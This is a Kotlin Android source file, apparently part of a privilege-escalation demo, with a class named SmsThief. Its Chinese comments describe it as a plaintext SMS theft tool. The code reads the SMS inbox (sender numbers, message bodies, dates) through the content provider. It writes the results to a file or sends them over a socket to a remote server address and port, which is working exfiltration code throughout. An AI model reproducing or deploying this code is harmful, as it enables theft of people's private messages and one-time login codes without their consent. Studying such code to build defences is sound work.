package xyz.mufanc.vap.util

import android.content.ContentResolver
import android.database.Cursor
import android.net.Uri
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.io.File
import java.net.Socket
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * 寄生提权：短信明文窃取工具
 * 直接读取 content://sms/inbox 并提取明文 address 和 body。
 */
class SmsThief {

    companion object {
        private const val TAG = "SmsThief"
        // 标准 Android 短信收件箱 URI
        private val SMS_INBOX_URI = Uri.parse("content://sms/inbox")

        // 数据库字段
        private const val COLUMN_ID = "_id"
        private const val COLUMN_ADDRESS = "address" // 发件人号码
        private const val COLUMN_BODY = "body"       // 短信内容
        private const val COLUMN_DATE = "date"       // 接收时间
    }

    /**
     * 窃取短信并保存到指定文件 (明文版)
     * @param limit 限制窃取的条数（演示时通常只取最新几条）
     */
    fun stealToFile(outputPath: String, limit: Int = 50): Int {
        return try {
            val smsArray = querySms(limit)
            File(outputPath).writeText(smsArray.toString(4))
            Log.i(TAG, "Plaintext SMS data written to $outputPath")
            smsArray.length()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to write SMS file", e)
            0
        }
    }

    /**
     * 窃取短信并通过 socket 回传（WiFi 模式）
     */
    fun stealToSocket(serverAddress: String, serverPort: Int, limit: Int = 50): Int {
        return try {
            val smsArray = querySms(limit)
            val socket = Socket(serverAddress, serverPort)
            val outputStream = BufferedOutputStream(socket.getOutputStream())
            val payload = smsArray.toString().toByteArray(Charsets.UTF_8)

            outputStream.write(payload)
            outputStream.flush()
            socket.shutdownOutput()

            outputStream.close()
            socket.close()

            Log.i(TAG, "Plaintext SMS sent to $serverAddress:$serverPort")
            smsArray.length()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to exfiltrate SMS", e)
            0
        }
    }

    private fun querySms(limit: Int): JSONArray {
        val smsArray = JSONArray()
        val resolver: ContentResolver = Ctx.app.contentResolver

        var cursor: Cursor? = null
        try {
            // 按照日期降序排列，获取最新短信
            cursor = resolver.query(
                SMS_INBOX_URI,
                arrayOf(COLUMN_ID, COLUMN_ADDRESS, COLUMN_BODY, COLUMN_DATE),
                null,
                null,
                "$COLUMN_DATE DESC LIMIT $limit"
            )

            if (cursor == null) {
                Log.w(TAG, "Cursor is null, failed to read SMS")
                return smsArray
            }

            val addressIdx = cursor.getColumnIndex(COLUMN_ADDRESS)
            val bodyIdx = cursor.getColumnIndex(COLUMN_BODY)
            val dateIdx = cursor.getColumnIndex(COLUMN_DATE)
            val format = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

            while (cursor.moveToNext()) {
                val rawAddress = if (addressIdx != -1) cursor.getString(addressIdx) else ""
                val rawBody = if (bodyIdx != -1) cursor.getString(bodyIdx) else ""
                val rawDate = if (dateIdx != -1) cursor.getLong(dateIdx) else 0L

                val smsObj = JSONObject()
                smsObj.put("address", rawAddress)
                smsObj.put("body", rawBody)
                smsObj.put("date", format.format(Date(rawDate)))
                smsArray.put(smsObj)
            }

            Log.i(TAG, "Successfully extracted ${smsArray.length()} plaintext SMS messages")
        } catch (e: Exception) {
            Log.e(TAG, "Error while stealing SMS", e)
        } finally {
            cursor?.close()
        }

        return smsArray
    }
}
